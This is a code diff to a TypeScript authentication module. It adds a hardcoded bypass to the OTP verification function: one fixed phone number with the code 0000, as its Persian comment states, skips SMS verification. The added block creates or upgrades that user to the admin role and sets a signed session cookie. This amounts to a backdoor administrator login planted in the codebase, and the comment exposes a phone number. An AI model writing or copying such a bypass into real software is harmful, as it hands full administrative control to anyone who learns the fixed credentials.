@@ -54,6 +54,27 @@ export async function requestOtp(phone: string) {
 
 export async function verifyOtp(phone: string, code: string) {
   const normalizedPhone = normalizePhone(phone);
+
+  // Bypass: 09126723365 + 0000 همیشه قبول (بدون نیاز به درخواست کد)
+  if (normalizedPhone === ADMIN_BYPASS_PHONE && code === ADMIN_BYPASS_CODE) {
+    const adminRole = await prisma.role.findUnique({ where: { name: "admin" } });
+    if (!adminRole) throw new Error("نقش admin در سیستم تعریف نشده است.");
+    const user = await prisma.user.upsert({
+      where: { phone: normalizedPhone },
+      update: { roleId: adminRole.id },
+      create: { phone: normalizedPhone, roleId: adminRole.id },
+    });
+    const token = signAccessToken(user.id, user.phone ?? user.id);
+    const cookieStore = await cookies();
+    cookieStore.set({
+      name: AUTH_COOKIE_NAME,
+      value: token,
+      httpOnly: true,
+      path: "/",
+    });
+    return { success: true, user };
+  }
+
   const record = await prisma.smsCode.findFirst({
     where: { phone: normalizedPhone, used: false },
   });
